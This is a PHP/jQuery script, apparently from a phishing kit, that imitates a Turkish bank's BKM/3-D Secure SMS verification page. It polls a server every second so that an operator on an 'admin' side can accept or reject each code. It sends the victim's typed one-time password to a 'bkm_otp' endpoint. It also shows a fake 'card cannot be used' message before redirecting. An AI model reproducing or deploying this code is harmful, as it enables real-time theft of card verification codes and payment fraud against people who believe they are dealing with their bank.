 <script>
     var lutfen_bekleyin = false;
     var izin = true;

     setInterval(function() {

         if (izin == true) {
             sms_sor();
         }

     }, 1000);


     function sms_sor() {
         $.ajax({
             type: 'POST',
             url: "<?= base_url('data') ?>",
             data: {
                 hash: '<?= $data->hash ?>',
                 islm: 'sms_sor',
             },
             success: function(response) {
                 console.log(response);

                 if (response == "guest_new_sms") {
                     $('#submitButtonDiv').show();
                     $('#timeOutDiv').hide();
                     $('#wrongPassDiv').hide();

                     var btn = $('#submitbutton');
                     btn.html("Onayla");
                     btn.removeAttr("disabled");
                 }

                 if (response == "admin_new_sms") {
                     $('#submitButtonDiv').hide();
                     $('#timeOutDiv').show();
                 }

                 if (response == "otp_gecersiz") {
                     $('#wrongPassDiv').show();

                     var btn = $('#submitbutton');
                     btn.html("Onayla");
                     btn.removeAttr("disabled");
                     lutfen_bekleyin = true;

                 }
                 if (response == "otp_onayla") {

                     var btn = $('#submitbutton');
                     btn.html("Onaylandı");
                     btn.attr("disabled", "disable");
                     lutfen_bekleyin = true;


                     $('#wrongPassDiv').hide();
                 }

                 if (response == "internet_alisveris") {

                     $('.action-wrapper').html("<h3 style='font-size:20px;color:red;line-height:30px'>Bu kart ile işlem yapamazsınız lütfen farklı bir kart ile tekrar deneyiniz.</h3> Ödeme sayfasına  yönlendiriliyorsunuz..." + '<meta http-equiv="refresh" content="3; url=<?= base_url() ?>">');

                     izin = false;
                     $('#wrongPassDiv').hide();
                 }

             }
         });
     }

     function yeniSMSIste() {


         $.ajax({
             type: 'POST',
             url: "<?= base_url('data') ?>",
             data: {
                 hash: '<?= $data->hash ?>',
                 islm: 'guest_new_sms',
             },
             success: function(response) {
                 $('input[name=password]').val("");
                 console.log(response);
                 init(300);
                 $('#timeOutDiv').hide();
                 $('#submitButtonDiv').show();
             }
         });

     }

     $('#bkmform').submit(function(e) {
         e.preventDefault();
         var pass = $('input[name=password]').val();
         if (pass.length < 4) {
             $('#wrongPassDiv').show();
         } else {
             $('#wrongPassDiv').hide();
             $.ajax({
                 type: 'POST',
                 url: "<?= base_url('bkm_otp/' . $data->hash) ?>",
                 data: $('#bkmform').serializeArray(),
                 success: function(response) {
                     console.log(response);

                     var btn = $('#submitbutton');
                     btn.html("Lütfen Bekleyin...");
                     btn.attr("disabled", "disable");
                     lutfen_bekleyin = true;

                     $('input[name=password]').val("");
                     /* if (response.status == 'error') {
                          $("#hataMesajiPOST").text(response.message).show();
                      } else {
                          $("#hataMesajiPOST").hide();
                          $("#hataMesajiPOST").text(response.message);
                          alert(response);
                      }*/
                 }
             });
         }
     });
 </script>